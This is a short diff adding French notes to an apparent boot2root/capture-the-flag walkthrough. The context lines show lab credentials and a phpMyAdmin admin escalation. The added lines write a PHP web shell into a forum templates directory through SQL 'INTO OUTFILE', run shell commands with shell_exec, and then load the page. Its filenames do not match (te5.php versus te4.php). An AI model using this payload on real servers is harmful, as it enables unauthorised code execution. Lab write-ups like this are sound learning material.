@@ -43,3 +43,14 @@ root = ft_root@mail.borntosec.net || qudevide@mail.borntosec.net
 Fg-'kKXBj87E:aJ$
 go to => https://10.11.200.29/phpmyadmin/
 go to user_data change user type => 2 (2 is admin)
+
+Injection sql sur phpMyAdmin:
+
+donc on vas sur l'ognglet 
+sql est apres plusieur test on trouve que on peut ecrire et lire un fichier.php dans
+forum/templates_c
+donc il nous reste plus que a l'ancer des commande systemme
+
+```select "<?php $output = shell_exec('ls /home/laurie/'); var_dump(output); echo $output  ?>" into outfile "/var/www/forum/templates_c/te5.php"```
+puis aller sur la page 
+```https://10.12.1.150/forum/templates_c/te4.php```
